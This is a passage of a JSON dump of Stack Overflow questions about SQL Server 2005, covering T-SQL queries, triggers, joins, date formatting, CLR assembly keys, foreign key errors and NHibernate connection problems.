ISNULL(InStock, 0)\n                       FROM     SprokInvetory\n                       WHERE    id = @SprokId\n                     )\n\n\n        DECLARE @Result INT\n\n        IF @Total - @Active &gt; 0 \n            SET @Result = 1\n        ELSE \n            SET @Result = 0  \n        RETURN @Result;\n    END;\n</code></pre>\n"},{"tags":["sql","sql-server","sql-server-2005","triggers"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":67,"score":0,"question_id":11761268,"title":"Creating Triggers","body":"<p>I am trying to create a trigger for the first time. I would like to update multiple fields in table (Opps) once another field, within the same table, is amended. I am not sure that Triggers are the best way to go about it, but I think it is. The fields I want to update are (currStage) and (stageDate) with the second field being the date that the original field (Stage) was amended. Does that make sense?</p>\n\n<p>Any help would be greatly appreciated as I am lost right now.</p>\n"},{"tags":["sql","sql-server","sql-server-2005","union"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":63,"score":0,"question_id":11762168,"title":"Top 10 results on rows obtained by UNION","body":"<p>I am using MSSQL 2005 for a query, say:</p>\n\n<pre><code>SELECT * from Emp UNION ALL SELECT * from Emp2;\n</code></pre>\n\n<p>And I want to limit the final result to 10 rows.\nIF I had only the Emp table, I would say</p>\n\n<pre><code>SELECT TOP 10 * from Emp;\n</code></pre>\n\n<p>But since I have 2 tables now, I can't say SELECT TOP * on any of them, neither I can use LIMIT 10 in the end.\nDo you have any suggestion?</p>\n"},{"tags":["sql","sql-server-2005","date","modulo"],"answer_count":3,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":137,"score":3,"question_id":11747851,"title":"Modulo Time in SQL Server 2005 - Return data every n hours","body":"<p>I have something like this: </p>\n\n<pre><code> SELECt *\n   FROM (\n        SELECT prodid, date, time, tmp, rowid\n          FROM live_pilot_plant\n         WHERE date BETWEEN CONVERT(DATETIME, '3/19/2012', 101)\n           AND CONVERT(DATETIME, '3/31/2012', 101)\n         ) b\n  WHERE b.rowid % 400 = 0\n</code></pre>\n\n<p>FYI: The reason for the convert in the where clause, is because my date is stored as a varchar(10), I had to convert it to datetime in order to get the correct range of data. (I tried a bunch of different things and this worked)</p>\n\n<p>I'm wondering how I can return the data I want every 4 hours during those selected dates.  I have data collected approximately every 5 seconds (with some breaks in data) - ie data wasn't collected during a 2 hour period, but then continues at 5 second increments.</p>\n\n<p>In my example I just used a modulo with my rowid - and the syntax works, but as I mentioned above there are some periods where data isnt collected so using logic like: if you take data every 5 seconds and multiple that by 4 hours you can approximately say how many rows are in between wont work.  </p>\n\n<p>My time column is a varchar column and is in the form  hh:mm:ss</p>\n\n<p>My ideal output is:</p>\n\n<pre><code>  | prodid  | date       | time      |  tmp  |\n  |    4    | 3/19/2012  | 10:00:00  |  2.3  |\n  |    7    | 3/19/2012  | 14:00:24  |  3.2  |\n</code></pre>\n\n<p>As you can see I can be a bit off (in terms of seconds) - I more so need the approximate value in terms of time.</p>\n\n<p>Thank you in advance.</p>\n"},{"tags":["sql","sql-server","sql-server-2005","like-operator"],"answer_count":8,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":728,"score":1,"question_id":5558856,"title":"LIKE clause is not working in SQL server","body":"<p>I have a table which have the following columns in SQL Server 2005:</p>\n\n<pre><code>DocID   NSN  QTY\n-----------------\nDHA12    32    5\nDSRB23   22   45\nTF22     70   23\n</code></pre>\n\n<p>Whenever I perform the following query to get all the NSN which have a DocId that starts with either DSRB or DHA, it gives me empty set:</p>\n\n<pre><code>SELECT  DocId, NSN, Qty, RequestDate, ReceiveDate\n  FROM  Orders \n WHERE (DocID LIKE '%DSRB%') \n   AND (DocID LIKE '%DHA%')  \n</code></pre>\n\n<p>I guess the problem with having two LIKE clauses because when I delete the last LIKE clause, the query works fine. </p>\n"},{"tags":["sql-server-2005","dateadd"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":68,"score":0,"question_id":11755961,"title":"Need a date instead of datetime in SQL Server 2005 with dateadd","body":"<p>I've got a query that get's a date of a field in a program. This date has to be modified with 10 years.</p>\n\n<p>The query I made is</p>\n\n<pre><code>SELECT DATEADD(yy, +10, '\"+thisfield.value+\"')\n</code></pre>\n\n<p>where <code>'\"+thisfield.value+\"'</code> is coming from the program and is filled in like <code>01-08-2012</code>.</p>\n\n<p>The result of the query is <code>2022-07-31 00:00:00.000</code>. The problem I have is that I just need <code>2022-08-01</code> but in the format of <code>01-08-2022</code> so that I can automatically fill an other field with this result.</p>\n\n<p>In SQL Server 2005 the date function doesn't work only the datetime function and I just don't need that.</p>\n\n<p>I hope this is clear (first time i post something). Can anyone help me?</p>\n"},{"tags":["sql","tsql","sql-server-2005"],"answer_count":4,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":55,"score":0,"question_id":11753641,"title":"How to update value of column x with value of column y?","body":"<p>I have a large table with a column x that I want to replicate to another column y in the same table. What would be the SQL statement for this?</p>\n\n<p>The 1 st column is called <code>name</code> and it contains first name and last name separated by a space. How to move those to new first name and last name columns?</p>\n"},{"tags":["c#","asp.net","sql-server-2005","sql-server-2000","strongly-typed-dataset"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":60,"score":1,"question_id":11752337,"title":"CAN strongly typed DataSet work with SQL Server 2000","body":"<p>I've written a Strongly Typed DataSet dll with SQL Server 2005. And I've been used name parameters in DataSet Queries. </p>\n\n<p>Can I only set the connectionstring point to a SQL Server 2000 for this dll without any modifies.</p>\n\n<p>Info:\nWebSite : Asp.net (C# 3.5 LinQ To DataSet )\nDataSet : Strongly Typed DataSet( develop with SQL Server 2005 and named parameters)</p>\n"},{"tags":["sql-server","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":5944,"score":0,"question_id":3043154,"title":"Combining multiple condition in single case statement in Sql Server","body":"<p>According to the following description i have to frame a <code>case ...En</code>d statement in Sql server ,help me to frame a complex case..End statement to fulfil the following condition.</p>\n\n<pre><code>if PAT_ENT.SCR_DT is not null and PAT_ENTRY.ELIGIBILITY is null then display display 'Favor'\nif PAT_ENT.SCR_DT is not null and PAT_ENTRY.EL is equal to No, display 'Error'\nif PAT_ENTRY.EL is Yes and DS.DES is equal to null or OFF, display 'Active'\nif DS.DES is equal to N, display 'Early Term'\nif DS.DES is equal to Y, display 'Complete'\n</code></pre>\n\n<p>Thanks in advance.</p>\n"},{"tags":["sql","sql-server","sql-server-2005","tsql","stored-procedures"],"answer_count":15,"favorite_count":114,"up_vote_count":270,"down_vote_count":0,"view_count":427434,"score":270,"question_id":653714,"title":"How to SELECT * INTO [temp table] FROM [stored procedure] ","body":"<p>How do I do a <code>SELECT * INTO [temp table] FROM [stored procedure]</code>? Not FROM [Table] and without defining [temp table]?</p>\n\n<p>Select all data from <em>BusinessLine</em> into <em>tmpBusLine</em> works fine.</p>\n\n<pre><code>select * into tmpBusLine\nfrom BusinessLine\n</code></pre>\n\n<p>Trying the same, but using a stored procedure that returns data, is not quite the same.</p>\n\n<pre><code>select * into tmpBusLine from\nexec getBusinessLineHistory '16 Mar 2009'\n</code></pre>\n\n<p>Output message:</p>\n\n<blockquote>\n  <p>Msg 156, Level 15, State 1, Line 2\n  Incorrect syntax near the keyword\n  'exec'.</p>\n</blockquote>\n\n<p>I have read several examples of creating a temporary table with the same structure as the output stored procedure, which works fine, but it would be nice to not supply any columns.</p>\n\n<p>I am using SQL Server 2005.</p>\n"},{"tags":["sql","sql-server","sql-server-2008","sql-server-2005","sql-update"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":145,"score":2,"question_id":11742649,"title":"How can I update all rows in a table and increment a column?","body":"<p>I have a table in a SQL Server 2008 database. I need to update a particular column's value but increment it's value at the same time. To explain:</p>\n\n<p>If the table is :</p>\n\n<pre><code>CREATE TABLE [dbo].[Player]\n(\n    [PlayerID] [uniqueidentifier] NOT NULL,\n    [UnitID] [uniqueidentifier] NULL,\n    [ExerciseID] [uniqueidentifier] NOT NULL,\n    [Designation] [nvarchar](256) NOT NULL\n)\n</code></pre>\n\n<p>I want to go through every row which has an <code>ExerciseID</code> of <code>42C45D73-3FE6-4AFA-8E2F-09BDFC6CBDF7</code> and update the <code>Designation</code> to be <code>Player - X</code> but X should start at 1 and increment itself by one every time.  </p>\n\n<p>So the first player to be updated would be <code>Player - 1</code> the second would be <code>Player - 2</code> and so on.</p>\n\n<p>I have no idea where to start with something like this!</p>\n\n<p>Thanks</p>\n"},{"tags":["performance","sql-server-2005"],"answer_count":2,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":70,"score":1,"question_id":11675077,"title":"Measure the time it takes to execute a t-sql query","body":"<p>I have two t-sql queries using SqlServer 2005. How can I measure how long it takes for each one to run? </p>\n\n<p>Using my stopwatch doesn't cut it.</p>\n"},{"tags":["sql-server-2005","reporting-services","formatting","globalization"],"answer_count":2,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":714,"score":4,"question_id":8822986,"title":"Changing currency symbol in SQL Reporting 2005","body":"<p>I'm using SQL Reporting 2005. I'm formatting a currency in a cell using</p>\n\n<pre><code>Format(Fields!NetPrice.Value, \"C\")\n</code></pre>\n\n<p>but the format is coming out</p>\n\n<pre><code>$10.00\n</code></pre>\n\n<p>I want pounds so</p>\n\n<pre><code>10.00\n</code></pre>\n\n<p>Can someone tell me where is the setting to do this. I've looked and google and can't find it. Is it obvious? I want to set it on the report level if possible and not alter SQL Server settings due to minimise impact elsewhere.</p>\n\n<p>I could cast the currency to a string and add <code>\"\"</code> I guess but I want to do it properly. </p>\n"},{"tags":["sql","sql-server","sql-server-2008","tsql","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":40,"score":0,"question_id":11547092,"title":"Order grouped values differently in SQL Server","body":"<pre><code>select \n  source_of_data,\n  convert(varchar(10),a.DATECREATED,101),\n  COUNT(*)\nfrom some_table a\ngroup by\n  source_of_data, \n  convert(varchar(10),a.DATECREATED,101)\norder by \n  source_of_data,\n  convert(varchar(10),a.DATECREATED,101)\n</code></pre>\n\n<p>Output data looks like this:</p>\n\n<pre><code>mainframe 4/5/11  22\nmainframe 4/6/11  45\nmainframe n/n/nn  nn\nsqlserver 4/5/11  44\nsqlserver 4/6/11  67\nsqlserver n/n/nn  nn\n</code></pre>\n\n<p>But I want the output to look like this:</p>\n\n<pre><code>mainframe 4/5/11  22\nsqlserver 4/5/11  44\nmainframe 4/6/11  45\nsqlserver 4/6/11  67\nmainframe n/n/nn  nn\nsqlserver n/n/nn  nn\n</code></pre>\n\n<p>This way I can easily verify visually if a grouped entry for any particular date is missingsay for some day we get mainframe data but sqlserver data is missing. Can someone please help modify the query so I don't have to resort to writing a stored proc to achieve my objective?</p>\n"},{"tags":["sql","sql-server","sql-server-2005","where-clause"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":126,"score":0,"question_id":11728541,"title":"Select Multiple Values in Where Time Clause Equals","body":"<p>My table looks like this:</p>\n\n<p>Table 1:\nNote: This table is very large in reality, with lots more columns (20ish) and rows (in the millions)</p>\n\n<pre><code> |  Time      |  tmp   |  productionID  |\n |  10:00:00  |   2.2  |    5           |\n |  10:00:05  |   5.2  |    5           |\n |  10:00:11  |   7.4  |    5           |\n |  ......    |   3.2  |    5           |\n |  10:10:02  |   4.5  |    5           |\n</code></pre>\n\n<p>Note: Timeis a varchar, so I assume I need to do something like this:</p>\n\n<pre><code> CONVERT(VARCHAR(8), DATEADD(mi, 10, time), 114)\n</code></pre>\n\n<p>What I need to do is:</p>\n\n<pre><code> select time, tmp \n from mytable\n where productionid = somevalue \n and time = first_time_stamp associated to some productionID(ie. 10:00:00 table above)\n     time = 10 minutes after the first_time_stamp with some productionID\n     time = 20 minutes after the first_time_stamp with some productionID\n     ...25, 30, 40, 60, 120, 180 minutes \n</code></pre>\n\n<p>I hope this  makes sense.  I'm not sure what the right way to do this is.  I mean I thought of the following proccess:\n-select first time stamp (with some productionID)\n-add 10 minutes to that that time, \n-add 20 minutes etc.. then use a pivot table and use joins to link to table 1\nThere must be an easier way.</p>\n\n<p>Thank you in advance for the expertise.</p>\n\n<p>Sample output expected:</p>\n\n<pre><code>    |  Time    | tmp\n    | 10:00:00 | 2.2 \n    | 10:10:02 | 4.5\n    | 10:20:54 | 2.3 \n    | 10:30:22 | 5.3\n</code></pre>\n"},{"tags":["sql-server","sql-server-2005"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":64,"score":0,"question_id":11740321,"title":"Creating asymmetric key - key already exists error","body":"<p>I am attempting to create a SQL server function using a .dll as well as create a login that can be mapped to the assembly that has external access. I am using SQL Server 2005.  This is what I am doing:</p>\n\n<pre><code>USE master; \nGO  \n\nCREATE ASYMMETRIC KEY myKeyName FROM EXECUTABLE FILE = 'path\\to\\file\\sqlclr.dll'   \nCREATE LOGIN myKeyUser FROM ASYMMETRIC KEY myKeyName \nGRANT EXTERNAL ACCESS ASSEMBLY TO myKeyUser ; \nGO \n</code></pre>\n\n<p>I am getting the error :  \"An asymmetric key with name 'myKeyName ' already exists or this asymmetric key already has been added to the database.\"</p>\n\n<p>No matter what I change my key name to I get this error. \nI've read that creating an asymmetric key from an assembly that has already been used to create a key on the database will result in this error however I'm not sure if this is the case as I have been getting this error since my first attempt at creating the key and login. </p>\n\n<p>If it is an issue with a key already existing that used my assembly how would I be able to find and remove it? Since the name could be different I would have to find it via the assembly used to create it wouldn't I? I'm not finding much out there about this error. Any advice about how to resolve this would be very much appreciated. Thanks!</p>\n"},{"tags":["sql-server-2005"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":848,"score":0,"question_id":5894412,"title":"Time duration between two dates","body":"<p>i need to get the time duration in (hh:mm:ss) format between the two dates </p>\n\n<p><code>2011/05/05 11:45:02</code> and <code>2011/05/01 08:09:57</code></p>\n\n<p>For example if I had these two dates <code>2011/05/05 01:18:14</code> and <code>2011/05/05 11:00:00</code>, the result would be: <code>02:18:14</code></p>\n"},{"tags":["sql","sql-server","xml","sql-server-2005"],"answer_count":2,"favorite_count":2,"up_vote_count":5,"down_vote_count":0,"view_count":4213,"score":5,"question_id":304940,"title":"How to choose returned column name in a SELECT FOR XML query?","body":"<p>MS SQL has a convenient workaround for concatenating a column value from multiple rows into one value:</p>\n\n<pre><code>SELECT col1\n FROM table1\n WHERE col2 = 'x'\n ORDER by col3\n FOR XML path('')\n</code></pre>\n\n<p>and that returns a nice recordset:</p>\n\n<pre><code>XML_F52E2B61-18A1-11d1-B105-00805F49916B                                     \n---------------------------------------- \n&lt;col1&gt;Foo&lt;/col1&gt;&lt;col1&gt;Bar&lt;/col1&gt;\n</code></pre>\n\n<p>only the column name in the returned recordset is rather nasty!</p>\n\n<p>The column name seems to include random elements (or a GUID), and hence I am reluctant to use it in my application (different instances or different servers might have another GUID).  Unfortunately I cannot use * to select the value, and due to the restrictions in the existing application I cannot iterate through returned columns, either...</p>\n\n<p>Is there a way to force the column name in the returned recordset to something more sensible?</p>\n"},{"tags":["sql-server-2005"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":103,"score":1,"question_id":7494837,"title":"How to retrieve records based on column name using cursors","body":"<p>I am rekha and I am working data base. I am a fresher from past 2 months only I am working on sql server.</p>\n\n<p>I have a query that is I have 2 tables.for example businesstype table contains id,businesstype and location based on location I will retrieve the data.that's fine.and second table is like employee and columns are id,name and businesstype.so my question is for each businesstype I will get the records from the employee table ultimately as below:</p>\n\n<p>1,sathish,softwar\n4,pushpa,Software\n2,ramesh,Electronics\n4,rajesh,Electronics</p>\n\n<p>I solve this one by using joins,operators and subquery also.but I need the solution to this query by using cursors.</p>\n\n<p>I wrote like the following ways:</p>\n\n<p>1) SELECT ID, Name , BusinessType  FROM Employee \n                  WHERE BusinessType in (select BusinessType from Employee)\norder by BusinessType desc</p>\n\n<p>2)select ID,Name,BusinessType\nfrom Employee where exists (select BusinessType from Employee)</p>\n\n<p>3)select @Location = Location from @BusinessTypeTemp</p>\n\n<p>select ID\n      ,BusinessType\n      ,Location \n       from BusinessType where Location=@Location</p>\n\n<pre><code>DECLARE @TempEmployeeInfo varchar(500)\nDECLARE @pos        int,\n         @nextpos    int,\n        @nextRecpos int, \n        @valuelen   int\n</code></pre>\n\n<p>/* creating temp table to insert address types*/</p>\n\n<pre><code>CREATE TABLE  #EmployeeInfo (BusinessType nvarchar(80) )\nSELECT  @TempEmployeeInfo =   BusinessType FROM @EmployeeTemp\n</code></pre>\n\n<p>/* Code for checking  separator is ',' and save into temp table */</p>\n\n<pre><code>SELECT @pos = 0, @nextpos = 1\n\n\nWHILE @nextpos &gt; 0\nBEGIN\n\n\n  SELECT @nextpos = charindex(',', @TempEmployeeInfo, @pos + 1)\n  SELECT @valuelen = CASE WHEN @nextpos &gt; 0\n                          THEN @nextpos\n                          ELSE len(@TempEmployeeInfo) + 1\n                     END - @pos - 1\nINSERT #EmployeeInfo(BusinessType)  VALUES (convert(nvarchar, substring(@TempEmployeeInfo, @pos+1, @valuelen)))\n  SELECT @pos = @nextpos\nEND\n\n\n\n\n    SELECT @Count = count(BusinessType) from Employee WHERE BusinessType IN (SELECT BusinessType FROM #EmployeeInfo)\n        PRINT @count\n\n\n    IF(@Count&lt;&gt;0)\n        BEGIN\n\n\n            select ID,Name,BusinessType from Employee\n\n            WHERE BusinessType IN (SELECT BusinessType FROM #EmployeeInfo)\n            order by BusinessType desc\n\n\n       END\n    ELSE\n         BEGIN\n         SELECT 0 as ReturnID\n         END\n</code></pre>\n\n<p>But they don't want this, they want the result by using only cursors.and also I want to display the both table results in a single SP. </p>\n\n<p>So please anyone help me. Please send the replies urgent because today is my last day to solve this.</p>\n\n<p>Rekha</p>\n"},{"tags":["sql","sql-server","tsql","sql-server-2005"],"answer_count":6,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":453,"score":3,"question_id":10820105,"title":"T-SQL DELETE EXCEPT TOP 1","body":"<p>Is there any way to delete all the rows in a table except one (random) row, without specifying any column names in the <code>DELETE</code> statement?</p>\n\n<p>I'm trying to do something like this:</p>\n\n<pre><code>CREATE TABLE [dbo].[DeleteExceptTop1]([Id] INT)\nINSERT [dbo].[DeleteExceptTop1] SELECT 1\nINSERT [dbo].[DeleteExceptTop1] SELECT 2\nINSERT [dbo].[DeleteExceptTop1] SELECT 3\n\nSELECT * FROM [dbo].[DeleteExceptTop1]\n\nDELETE\nFROM [dbo].[DeleteExceptTop1]\nEXCEPT\nSELECT TOP 1 * FROM [dbo].[DeleteExceptTop1]\n\nSELECT * FROM [dbo].[DeleteExceptTop1]\n</code></pre>\n\n<p>The final <code>SELECT</code> should yield one row (could be any of the three). </p>\n"},{"tags":["sql","sql-server-2005","full-text-search"],"answer_count":1,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":48,"score":2,"question_id":11727267,"title":"Full Text search returns duplicate keys","body":"<p>I have a search like the example below. The problem is that the result returns a key multiple times if the term \"beach\" is in myTextColumn multiple times, for example \"I went to the beach because the beach is cool\". I need it to be returned only once.</p>\n\n<p>The database server is Microsoft SQL 2005</p>\n\n<pre><code>  SELECT DISTINCT          \n    Src.[Key] AS MyID\n  FROM            \n    CONTAINSTABLE(MyTable, myTextColumn, N'FORMSOF(INFLECTIONAL,beach )',500) Src\n  ORDER BY \n    MyID\n</code></pre>\n"},{"tags":["sql-server-2005","visual-studio-2008","oledbconnection"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":50,"score":1,"question_id":11729428,"title":"OLE DB Destination Editor not loading remote SQL table VS2008","body":"<p>I have a data flow task that shows the preview values for the flat file at the beginning, but at hte end for the ole db destination when preview is clicked nothing displays.  I am new to visual studio and C# both, and would appreciate any assitance I can provide.  WHen I run the whole solution, it completes normally (including writing to the log table in the same remotr SQL instance) but does not write any records to the SQL table. </p>\n\n<p>I see I am not asking the correct question - the PREVIEW in the ole db destination editor is to preview the name of the table or the view you are loading into, and not the data you \nare loading from. </p>\n\n<p>SO.. if anyone can help me with figuring out why the table is not being loaded but no errors produced I would appreciate it! </p>\n\n<p>Thanks in advance!</p>\n\n<p>Sandy</p>\n"},{"tags":["sql","sql-server-2005","insert"],"answer_count":1,"favorite_count":0,"up_vote_count":5,"down_vote_count":0,"view_count":421,"score":5,"question_id":10999396,"title":"How do I use an INSERT statement's OUTPUT clause to get the identity value?","body":"<p>If I have an insert statement such as:</p>\n\n<pre><code>INSERT INTO MyTable\n(  \n  Name,\n  Address,\n  PhoneNo\n)\nVALUES\n(\n  'Yatrix',\n   '1234 Address Stuff',\n   '1112223333'\n)\n</code></pre>\n\n<p>How do I set <code>@var INT</code> to the new row's identity value (called <code>Id</code>) using the OUTPUT clause? I've seen samples of putting INSERTED.Name into table variables, for example, but I can't get it into a non-table variable. </p>\n\n<p>I've tried <code>OUPUT INSERTED.Id AS @var</code>, <code>SET @var = INSERTED.Id</code>, but neither have worked. </p>\n\n<p>Thanks in advance.</p>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":65,"score":0,"question_id":11727091,"title":"SQL Server 2005 Unable to Create Relationship Because it's Conflicting with itself(?)","body":"<p>Consider the following tables (unnecessary fields have been omitted) and the relationships I'm trying to create:</p>\n\n<pre><code> Contractor__c               |Task                 |Account\n|----------------------------|---------------------|---------------|\n|Contractor__c NCHAR(18) NULL|WhatId NCHAR(18) NULL|Id NCHAR(18) PK|\n|Id            NCHAR(18) PK  |                     |               |\n\n FK_Contractor__c_Account\n|--------------------------------------|\n|PK        |FK                         |\n|----------|---------------------------|\n|Account.Id|Contractor__c.Contractor__c|\n\n FK_Task_Contractor__c\n|----------------------------|\n|PK              |FK         |\n|----------------|-----------|\n|Contractor__c.Id|Task.WhatId|\n</code></pre>\n\n<p>Sounds and looks simple enough, but both of the relationships fail to save to the database and I get the following errors for both:</p>\n\n<blockquote>\n  <p>Unable to create relationship 'FK_Contractor__c_Account'.   The ALTER\n  TABLE statement conflicted with the FOREIGN KEY constraint\n  \"FK_Contractor__c_Account\". The conflict occurred in database\n  \"Contractors\", table \"dbo.Account\", column 'Id'.</p>\n  \n  <p>Unable to create relationship 'FK_Task_Contractor__c'.   The ALTER\n  TABLE statement conflicted with the FOREIGN KEY constraint\n  \"FK_Task_Contractor_<em>c\". The conflict occurred in database\n  \"Contractors\", table \"dbo.Contractor</em>_c\", column 'Id'.</p>\n</blockquote>\n\n<p>I'm understanding the messages as it being unable to create the relationship because its conflicting with a relationship that has the same name that exists, even though in reality there isn't one. Can someone enlighten me on what's going on here?</p>\n\n<p>For anyone who cares, I'm using SQL Server 2005 SP4 (9.0.5057) and the tables are created from a Salesforce linked server using DBAmp.</p>\n"},{"tags":["multithreading","tsql","sql-server-2005","jdbc"],"answer_count":2,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":48,"score":0,"question_id":11673216,"title":"SQL Server how read a record and then write if it is not there without creating duplicates","body":"<p>What are the better techniques for inserting a record into a table if it is not there already?</p>\n\n<p>The issue is that the code checks if the record with the criteria exists, and if it does not, it creates one. However, a second thread could come along and check at the same time.</p>\n\n<p>We started experimenting with TABLOCKX which initially worked, although it felt a bit like using an elephant gun, but we are also looking at using snapshot isolation, and it doesn't work in that context, where the second transaction can just come along and read the table.</p>\n\n<p>This is a common problem, so it seems like there should be a more standard solution. Note that a unique index is not appropriate here, since the fields being searched can contain nulls, and SQL Server 2005 doesn't support a unique constraint in that context.</p>\n"},{"tags":["sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":33,"score":1,"question_id":11723692,"title":"SQL - condensing repeative boolan 'WHEN' statements","body":"<p>please can anyone suggest a way of condensing this code, to reduce its repetitive nature. many thanks</p>\n\n<pre><code>    select case\n    when c=1 and cs=1 and f=0 and fs=0 then 'FPL02'\n    when c=0 and cs=0 and f=1 and fs=1 then 'FPL03'\n    when c=1 and cs=0 and f=0 and fs=0 then 'FPL04'\n    when c=0 and cs=0 and f=1 and fs=0 then 'FPL05'\n    when c=1 and cs=1 and f=1 and fs=1 then 'FPL06'\n    when c=1 and cs=1 and f=1 and fs=0 then 'FPL07'\n    when c=1 and cs=0 and f=1 and fs=1 then 'FPL08'\n    when c=1 and cs=0 and f=1 and fs=0 then 'FPL09'\n    when Ab=1 then 'FPL10'\n    when cpc=1 and plo=0 then 'FPC01'\n    when cpc=0 and plo=1 then 'FPC02'\n    when cpc=1 and plo=1 then 'FPC03'\n    else 'FPL01' end\n\n    from (select ptmatter, BillLHAbsolute as Ab, BillLHChildren as C, BillLHChildrenSettle as CS, BillLHFinances as F, BillLHFinancesSettle as FS, BillLHCPC as CPC, BillLHPLO as PLO from MatterDataDef) as mmd\n    where ptmatter=$matter$\n</code></pre>\n"},{"tags":["tsql","sql-server-2005"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":50,"score":0,"question_id":11723185,"title":"What is wrong with this t-sql query using left join?","body":"<p>I have two sqlserver 2005 tables:  Task table and Travel table.</p>\n\n<p>I am trying to write a query that selects all records from the Task table for a specific Empid, and if the Task is travel, also get the mileage value from another table.  </p>\n\n<p>I expect only one row to be selected, but all rows in the Task table are returned.</p>\n\n<p>The query I am using is </p>\n\n<pre><code>Select Tasklog.TaskLogPkey, Tasklog.Empid , Tasklog.Task, TravelLog.Mileage from \nTasklog\nleft join TravelLog\non   \n   TaskLog.EmpId = 12 and TaskLog.Task ='Travel'   and \n   TaskLog.TaskLogPkey = TravelLog.TaskLogPkey\n</code></pre>\n\n<p>But it makes no difference if I dont include </p>\n\n<pre><code>  -- TaskLog.EmpId = 12 and TaskLog.Task ='Travel'   and \n</code></pre>\n\n<p>What am I doing wrong? </p>\n\n<p>Clearly the following doesn't work:</p>\n\n<pre><code>Select Tasklog.TaskLogPkey, Tasklog.Empid , Tasklog.Task, TravelLog.Mileage from \nTasklog where   TaskLog.EmpId = 12 and TaskLog.Task ='Travel' \nleft join TravelLog\non   \n   TaskLog.TaskLogPkey = TravelLog.TaskLogPkey\n</code></pre>\n\n<p>These are the tables I am using: </p>\n\n<pre><code>Create table TaskLog(\nTaskLogPkey int not null,\nEmpid  int,\nTask varchar(30)\n)\n\nInsert Tasklog values(1,12,'Sales')\nInsert Tasklog values(2,4,'Travel')\nInsert Tasklog values(3,63,'Meeting')\nInsert Tasklog values(4,12,'Travel')\nInsert Tasklog values(5,12,'Email')\nInsert Tasklog values(6,4,'Travel')\nInsert Tasklog values(7,63,'Meeting')\nInsert Tasklog values(8,12,'PhoneCall')\n\n\nCreate table TravelLog(\nTaskLogPkey int not null,\nMileage  int\n)\n\nInsert TravelLog values(2,45)\nInsert TravelLog values(4,25)\nInsert TravelLog values(6,18)\n</code></pre>\n"},{"tags":["sql","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":314,"score":2,"question_id":1714877,"title":"Should I use Roles or Schemas to give users access based on their department?","body":"<p>I want to give different level of access on tables to different users based on their department. Should I use Schema or Roles for this purpose?</p>\n"},{"tags":["sql-server-2005","nhibernate","iis","database-connection"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":134,"score":0,"question_id":10594752,"title":"Prod system random database lockdown with error GetServerTransactionLevel","body":"<p>We have an issue with our Silverlight .NET app with SQL Server database where suddenly most SQL commands sent from the webapp were throwing exceptions and users cannot login to the system.</p>\n\n<p>We quickly did an app-pool recycle and it fixed the error. We also checked the SQL 2005 database and there was no downtime and exceptions. The errors from the site logs are as follow:</p>\n\n<pre><code>An error occured during DoList | NHibernate.ADOException: could not execute query\nSystem.IndexOutOfRangeException: ContactID4_0_\nat System.Data.SqlClient.SqlDataReader.GetOrdinal(String name)\nat NHibernate.Type.NullableType.NullSafeGet(IDataReader rs, String name)\nat NHibernate.Loader.Loader.GetKeyFromResultSet(Int32 i, IEntityPersister     persister,      Object id, IDataReader rs, ISessionImplementor session)\n\nAn error occured during GetServerTransactionLevel System.NullReferenceException:           \nObject reference not set to an instance of an object.\nat System.Data.SqlClient.SqlInternalTransaction.GetServerTransactionLevel()\nat System.Data.SqlClient.SqlInternalTransaction.CheckTransactionLevelAndZombie()\nat System.Data.SqlClient.SqlInternalTransaction.Rollback()\nat System.Data.SqlClient.SqlInternalTransaction.Dispose(Boolean disposing)\nat System.Data.SqlClient.SqlTransaction.Dispose(Boolean disposing)\nat NHibernate.Transaction.AdoTransaction.Dispose(Boolean isDisposing)\n</code></pre>\n\n<p>The first error sometimes pop up in our system but never in a sense that causes the whole site to go down. The second error is new. I've done some research but hasn't find anything yet. It seems somehow the connection got corrupted or something cause all subsequent connections to error for some reason.</p>\n\n<p>Any help is much appreciated.</p>\n\n<p>Cheers,\nJosh</p>\n"}]}
